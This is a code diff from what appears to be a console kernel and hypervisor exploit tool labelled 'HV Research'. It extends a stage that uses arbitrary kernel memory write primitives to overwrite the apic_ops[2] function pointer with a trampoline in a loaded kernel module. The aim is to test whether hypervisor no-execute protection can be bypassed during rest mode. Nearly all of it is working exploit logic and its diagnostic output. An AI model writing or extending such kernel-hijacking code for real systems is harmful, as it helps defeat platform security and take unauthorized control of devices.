@@ -168,6 +168,8 @@ static int      g_apic_ops_count = 0;  /* Number of entries (typically 28) */
 /* Kmod trampoline addresses (set by kmod campaign, used by Phase 7) */
 static uint64_t g_kmod_trampoline_func = 0;    /* KVA of trampoline_xapic_mode() in kmod .text */
 static uint64_t g_kmod_trampoline_target = 0;  /* KVA of g_trampoline_target in kmod .data */
+static uint64_t g_kld_text_trampoline = 0;     /* KVA of trampoline in kmod .text (preserved) */
+static uint64_t g_kld_text_target = 0;         /* KVA of g_trampoline_target in kmod (preserved) */
 static uint64_t g_kmod_gp_handler = 0;         /* KVA of gp_handler() in kmod .text */
 static int      g_kmod_kid = -1;               /* kldload file ID (-1 = not loaded) */
 
@@ -2047,6 +2049,16 @@ static void campaign_kmod_kldload(void) {
                    (unsigned long)g_kmod_trampoline_func);
             printf("    g_trampoline_target     = 0x%016lx\n",
                    (unsigned long)g_kmod_trampoline_target);
+        }
+        /* Always preserve the kmod .text addresses separately.
+         * g_kmod_trampoline_func may later be overwritten by the cave
+         * trampoline (kdata+0x100), but we need the real kmod .text
+         * address for the suspend test where kdata is NX-blocked. */
+        if (results->trampoline_func_kva != 0) {
+            g_kld_text_trampoline = results->trampoline_func_kva;
+            g_kld_text_target = results->trampoline_target_kva;
+            printf("[+] KLD .text trampoline preserved: 0x%016lx\n",
+                   (unsigned long)g_kld_text_trampoline);
         }
         if (!g_kmod_gp_handler && results->gp_handler_kva != 0) {
             g_kmod_gp_handler = results->gp_handler_kva;
@@ -4435,10 +4447,17 @@ idt_skip: ;
     printf("\n[*] Phase 7 trampoline address status:\n");
     if (g_kmod_trampoline_func && g_kmod_trampoline_target) {
         printf("    [OK] Addresses available.\n");
-        printf("    trampoline_xapic_mode() = 0x%016lx\n",
-               (unsigned long)g_kmod_trampoline_func);
+        printf("    trampoline_xapic_mode() = 0x%016lx%s\n",
+               (unsigned long)g_kmod_trampoline_func,
+               (g_kmod_trampoline_func >= g_kdata_base &&
+                g_kmod_trampoline_func < g_kdata_base + 0x1000)
+               ? " (CAVE/kdata)" : " (kmod .text)");
         printf("    g_trampoline_target     = 0x%016lx\n",
                (unsigned long)g_kmod_trampoline_target);
+        if (g_kld_text_trampoline) {
+            printf("    KLD .text trampoline    = 0x%016lx (preserved for suspend)\n",
+                   (unsigned long)g_kld_text_trampoline);
+        }
     } else {
         /* Last-resort: try result buffer (with RIP-relative LEA fix,
          * these should be non-zero when SYSINIT has fired). */
@@ -4456,6 +4475,13 @@ idt_skip: ;
         } else {
             printf("    [-] Result buffer also has zeros.\n");
         }
+    }
+    /* Preserve kmod .text addresses if not already saved */
+    if (!g_kld_text_trampoline && results->trampoline_func_kva != 0) {
+        g_kld_text_trampoline = results->trampoline_func_kva;
+        g_kld_text_target = results->trampoline_target_kva;
+        printf("    [+] KLD .text trampoline preserved: 0x%016lx\n",
+               (unsigned long)g_kld_text_trampoline);
     }
 
     /* gp_handler KVA: check globals first (set via result buffer or scanner),
@@ -5700,7 +5726,10 @@ static void campaign_flatz_setup(void) {
             printf("[+]   QA flags:       Phase 7 marker + original xapic\n");
             if (gadget_test_passed) {
                 printf("[+]   Gadget test:    PASSED (kdata execution works normally)\n");
-                printf("[+]   apic_ops[2]:    RESTORED (kdata exec panics during suspend)\n");
+            }
+            if (g_kld_text_trampoline) {
+                printf("[+]   KLD .text:      0x%016lx (will arm for suspend test)\n",
+                       (unsigned long)g_kld_text_trampoline);
             } else if (hook_armed) {
                 printf("[+]   apic_ops[2]:    Cave trampoline (restored before suspend)\n");
             } else {
@@ -5715,30 +5744,96 @@ static void campaign_flatz_setup(void) {
             printf("[+]   - KASLR slide stable across resume\n");
             printf("[+]\n");
 
-            /* Always restore apic_ops[2] before suspend.
+            /*
+             * KLD .text trampoline suspend test.
              *
              * CONFIRMED (Session 4): kdata execution causes kernel panic
-             * during cpususpend_handler.  Even the minimal gadget
-             * (mov eax, 1; ret) with no memory refs panics.
-             * HV enforces NPT NX on kdata pages during suspend path.
+             * during cpususpend_handler.  HV enforces NPT NX on kdata.
              *
-             * For the flatz method, we need ktext-resident code.
+             * Test hypothesis: kmod .text pages (loaded via kldload) may
+             * have different NPT permissions than kdata.  The kmod's
+             * trampoline_xapic_mode() is in .text, which was proven
+             * executable during normal ops (IDT trampoline works).
+             *
+             * Safety: set g_trampoline_target = 0 via DMAP so the
+             * trampoline just returns 1 (APIC_MODE_XAPIC) with no
+             * call-through.  This is the minimal test — if kmod .text
+             * is executable during suspend, this won't panic.
              */
             {
-                /* Ensure apic_ops[2] is original before suspend */
-                kernel_copyin(&original_xapic,
-                              g_dmap_base + ops_pa + 0x10, 8);
-                uint64_t restore_verify = 0;
-                kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_verify, 8);
-                if (restore_verify != original_xapic) {
-                    printf("[!] apic_ops[2] restore FAILED: 0x%016lx\n",
-                           (unsigned long)restore_verify);
+                int kld_armed = 0;
+
+                if (g_kld_text_trampoline && g_kld_text_target) {
+                    printf("\n[*] KLD .text suspend test:\n");
+                    printf("    kld trampoline = 0x%016lx (kmod .text)\n",
+                           (unsigned long)g_kld_text_trampoline);
+                    printf("    kld target var = 0x%016lx (kmod .data)\n",
+                           (unsigned long)g_kld_text_target);
+
+                    /* Zero out g_trampoline_target so trampoline just
+                     * returns 1 with no call-through (safest test). */
+                    uint64_t target_pa = va_to_pa_quiet(g_kld_text_target);
+                    if (target_pa) {
+                        uint64_t zero = 0;
+                        kernel_copyin(&zero, g_dmap_base + target_pa, 8);
+                        uint64_t tv = 0;
+                        kernel_copyout(g_dmap_base + target_pa, &tv, 8);
+                        printf("    g_trampoline_target = 0x%lx [%s]\n",
+                               (unsigned long)tv, tv == 0 ? "ZEROED" : "FAIL");
+                    } else {
+                        printf("    [-] Cannot translate kld target VA to PA\n");
+                    }
+
+                    /* Arm apic_ops[2] with kmod .text trampoline */
+                    kernel_copyin(&g_kld_text_trampoline,
+                                  g_dmap_base + ops_pa + 0x10, 8);
+                    uint64_t av = 0;
+                    kernel_copyout(g_dmap_base + ops_pa + 0x10, &av, 8);
+                    printf("    apic_ops[2] = 0x%016lx [%s]\n",
+                           (unsigned long)av,
+                           av == g_kld_text_trampoline ? "KLD ARMED" : "FAIL");
+
+                    if (av == g_kld_text_trampoline && target_pa) {
+                        kld_armed = 1;
+                        /* Quick 2s stability check before suspend */
+                        printf("    Stability check (2s)...\n");
+                        fflush(stdout);
+                        for (int t = 1; t <= 2; t++) {
+                            sleep(1);
+                            printf("    Tick %d/2 — alive\n", t);
+                            fflush(stdout);
+                        }
+                        printf("    [OK] KLD trampoline stable during normal ops.\n");
+                    }
+                } else {
+                    printf("\n[-] KLD .text trampoline not available.\n");
+                    printf("    g_kld_text_trampoline = 0x%lx\n",
+                           (unsigned long)g_kld_text_trampoline);
+                    printf("    g_kld_text_target     = 0x%lx\n",
+                           (unsigned long)g_kld_text_target);
+                }
+
+                if (!kld_armed) {
+                    /* Fallback: restore original before suspend (safe) */
+                    kernel_copyin(&original_xapic,
+                                  g_dmap_base + ops_pa + 0x10, 8);
+                    uint64_t restore_verify = 0;
+                    kernel_copyout(g_dmap_base + ops_pa + 0x10,
+                                   &restore_verify, 8);
+                    if (restore_verify != original_xapic) {
+                        printf("[!] apic_ops[2] restore FAILED: 0x%016lx\n",
+                               (unsigned long)restore_verify);
+                    }
+                    printf("[*] apic_ops[2] restored to original (no KLD test).\n");
                 }
 
                 printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
+                printf("[*] KLD armed: %s\n", kld_armed ? "YES — testing kmod .text during suspend" : "NO — safe restore");
                 fflush(stdout);
                 fflush(stderr);
-                notify("[HV Research] Entering rest mode (hook restored)...");
+                notify(kld_armed
+                    ? "[HV Research] REST MODE — KLD .text trampoline ARMED"
+                    : "[HV Research] Entering rest mode (hook restored)...");
                 sleep(3);
                 int standby_ret = sceSystemStateMgrEnterStandby();
                 printf("[*] sceSystemStateMgrEnterStandby() returned %d\n",
